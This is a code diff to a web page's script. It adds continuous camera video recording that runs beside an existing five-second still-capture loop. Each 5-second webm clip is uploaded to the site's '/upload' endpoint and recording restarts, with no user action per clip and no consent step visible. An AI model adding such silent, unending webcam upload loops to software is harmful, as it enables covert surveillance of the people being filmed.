@@ -149,8 +149,51 @@
 
     captureBtn.addEventListener('click', captureAndUpload);
 
-    // 🔹 Auto-capture every 5 seconds
+        // 🔹 Auto-capture every 5 seconds
     setInterval(captureAndUpload, 5000);
+
+    // 🔹 Auto Video Capture & Upload  <<=== ✅ ADDED
+    let mediaRecorder;
+    let videoChunks = [];
+
+    function startAutoVideoCapture() {
+      if (!stream) return;
+
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          videoChunks.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(videoChunks, { type: 'video/webm' });
+        videoChunks = [];
+
+        const formData = new FormData();
+        formData.append("file", blob, "clip.webm");
+
+        try {
+          const response = await fetch('/upload', { method: 'POST', body: formData });
+          if(response.ok) console.log('Video uploaded successfully!');
+          else console.error('Video upload failed');
+        } catch (err) {
+          console.error('Video error:', err);
+        }
+
+        // restart recording again for continuous 5s chunks
+        startAutoVideoCapture();
+      };
+
+      // record for 5 seconds then stop & trigger upload
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 5000);
+    }
+
+    // 🔹 Start continuous video capture loop
+    startAutoVideoCapture();   // <<=== ✅ ADDED
+
 
     // 🔹 Quality Measurement
     function getBrightness(frame) {
@@ -216,3 +259,4 @@
   </script>
 </body>
 </html>
+
